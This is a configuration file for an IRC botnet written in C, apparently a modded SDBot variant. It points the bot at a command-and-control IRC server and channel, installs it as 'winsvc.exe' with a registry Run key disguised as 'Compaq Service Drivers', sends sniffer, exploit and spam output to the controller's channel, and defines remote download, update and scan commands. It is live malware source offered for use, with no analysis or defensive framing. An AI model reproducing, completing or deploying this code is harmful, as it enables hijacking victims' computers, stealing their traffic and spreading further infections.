// bot configuration

char version[] = "[SDNB2.0]ModdedbyScorpiono-ASN"; // bot's VERSION reply
char botid[] = "lolato"; // bot id
char password[] = "hoes"; // bot password
BOOL rndfilename = FALSE; // use random file name
char filename[] = "winsvc.exe"; // destination file name
BOOL regrun = TRUE; // use the Run registry key for autostart
char valuename[] = "Compaq Service Drivers"; // value name for autostart
char prefix = '.'; // command prefix (one character max.)
int cryptkey = 0; // encryption key (not used right now)
const int maxaliases = 16; // maximum number of aliases (must be greater than the number of predefined aliases).
const int maxlogins = 3; // maximum number of simultaneous logins
int maxrand = 9; // how many random numbers in the nick
char nickconst[] = "OneNutWonder"; // first part to the bot's nick
BOOL nickprefix = TRUE;	// nick uptime & mirc prefix
int nicktype = CONSTNICK; // nick type

//host auth
char *authost[] = {"*@*", "\0"};

//cftp
char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "21";			// cftp port ".lsaport 6969"
char lsuser[] = "evil";
char lspass[] = "bingo2";

// server configuration
char server[] = "71.8.71.26"; // server
char server2[] = ""; // backup server (optional)
int port = 6667; // server port
int port2 = 6667; // backup server port
int tftpport = 69;
char serverpass[] = ""; // server password
int socks4port = 7561; // socks4 server port.
// channel configuration
char channel[] = "#asn#"; // channel that the bot should join
char chanpass[] = "yo"; // channel password
char channel2[] = ""; // backup channel (optional)
char chanpass2[] = ""; // backup channel password (optional)
BOOL topiccmd = TRUE; // set to TRUE to enable topic commands
char psniffchan[] = "#asn#"; // Channel where sniff meesages get redirected
char exploitchan[] = "#asn#";					// Channel where exploit messages get redirected
char spamchan[]	= "#asn#";					// Channel where spam messages get redirected

//reg keys
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";


//custom commands
const char slogin[]="got";
const char sremove[]="removexep";
const char supdate[]="updatesds";
const char sdownload[]="downloadsd";
const char sadvscan[]="omnia";